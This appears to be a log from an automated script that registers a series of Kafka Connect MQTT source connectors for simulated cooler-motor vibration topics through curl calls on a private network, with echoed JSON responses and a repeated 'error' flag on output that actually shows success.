+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt4_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-5", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1026  100   542  100   484  38714  34571 --:--:-- --:--:-- --:--:-- 73285
+{"name":"source-mqtt4_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-5","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt4_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt5_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-6", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1026  100   542  100   484  41692  37230 --:--:-- --:--:-- --:--:-- 78923
+{"name":"source-mqtt5_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-6","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt5_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt6_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-7", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1026  100   542  100   484  41692  37230 --:--:-- --:--:-- --:--:-- 78923
+{"name":"source-mqtt6_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-7","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt6_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt7_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-8", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0{"name":"source-mqtt7_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-8","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt7_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}100  1026  100   542  100   484  45166  40333 --:--:-- --:--:-- --:--:-- 85500
+[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt8_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-9", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1026  100   542  100   484  54200  48400 --:--:-- --:--:-- --:--:--  100k
+{"name":"source-mqtt8_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-9","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt8_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt9_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-10", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1028  100   543  100   485  38785  34642 --:--:-- --:--:-- --:--:-- 73428
+{"name":"source-mqtt9_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-10","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt9_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt10_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-11", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  45416  40500 --:--:-- --:--:-- --:--:-- 93727
+{"name":"source-mqtt10_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-11","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt10_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt11_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-12", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  45416  40500 --:--:-- --:--:-- --:--:-- 85916
+{"name":"source-mqtt11_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-12","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt11_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt12_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-13", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  38928  34714 --:--:-- --:--:-- --:--:-- 79307
+{"name":"source-mqtt12_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-13","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt12_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt13_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-14", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  49545  44181 --:--:-- --:--:-- --:--:-- 93727
+{"name":"source-mqtt13_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-14","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt13_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt14_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-15", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  45416  40500 --:--:-- --:--:-- --:--:-- 85916
+{"name":"source-mqtt14_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-15","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt14_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt15_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-16", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  45416  40500 --:--:-- --:--:-- --:--:-- 85916
+{"name":"source-mqtt15_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-16","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt15_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt16_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-17", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  41923  37384 --:--:-- --:--:-- --:--:-- 79307
+{"name":"source-mqtt16_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-17","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt16_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt17_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-18", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  41923  37384 --:--:-- --:--:-- --:--:-- 79307
+{"name":"source-mqtt17_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-18","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt17_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt18_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-19", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0{"name":"source-mqtt18_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-19","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt18_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}100  1031  100   545  100   486  41923  37384 --:--:-- --:--:-- --:--:-- 85916
+[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt19_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-20", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  41923  37384 --:--:-- --:--:-- --:--:-- 73642100  1031  100   545  100   486  41923  37384 --:--:-- --:--:-- --:--:-- 73642
+{"name":"source-mqtt19_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-20","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt19_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt20_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-21", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+qt.qpa.xcb: could not connect to display 
+qt.qpa.plugin: Could not load the Qt platform plugin "xcb" in "" even though it was found.
+This application failed to start because no Qt platform plugin could be initialized. Reinstalling the application may fix this problem.
+
+Available platform plugins are: eglfs, linuxfb, minimal, minimalegl, offscreen, vnc, wayland-egl, wayland, wayland-xcomposite-egl, wayland-xcomposite-glx, xcb.
+
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  41923  37384 --:--:-- --:--:-- --:--:-- 79307
+{"name":"source-mqtt20_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-21","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt20_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt21_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-22", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  49545  44181 --:--:-- --:--:-- --:--:-- 93727
+{"name":"source-mqtt21_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-22","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt21_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt22_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-23", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  45416  40500 --:--:-- --:--:-- --:--:-- 85916
+{"name":"source-mqtt22_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-23","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt22_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
+Container will execute command='curl -X POST -H "Content-Type: application/json" -d \'{"name": "source-mqtt23_2024_03_11_10_57_45_852817", "config": {"connector.class": "com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector", "tasks.max": "1", "connect.mqtt.hosts": "tcp://192.168.3.1:1883", "connect.mqtt.converter.throw.on.error": "true", "connect.mqtt.service.quality": "2", "connect.mqtt.kcql": "INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-24", "connect.mqtt.username": "admin", "connect.mqtt.password": "adminpass"}}\' http://192.168.15.12:8083/connectors'
+[91m Command output contains 'error'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1031  100   545  100   486  54500  48600 --:--:-- --:--:-- --:--:--  100k
+{"name":"source-mqtt23_2024_03_11_10_57_45_852817","config":{"connector.class":"com.datamountaineer.streamreactor.connect.mqtt.source.MqttSourceConnector","tasks.max":"1","connect.mqtt.hosts":"tcp://192.168.3.1:1883","connect.mqtt.converter.throw.on.error":"true","connect.mqtt.service.quality":"2","connect.mqtt.kcql":"INSERT INTO kafka-topic SELECT * FROM vibration/cooler-iotsim-cooler-motor-24","connect.mqtt.username":"admin","connect.mqtt.password":"adminpass","name":"source-mqtt23_2024_03_11_10_57_45_852817"},"tasks":[],"type":"source"}[0m
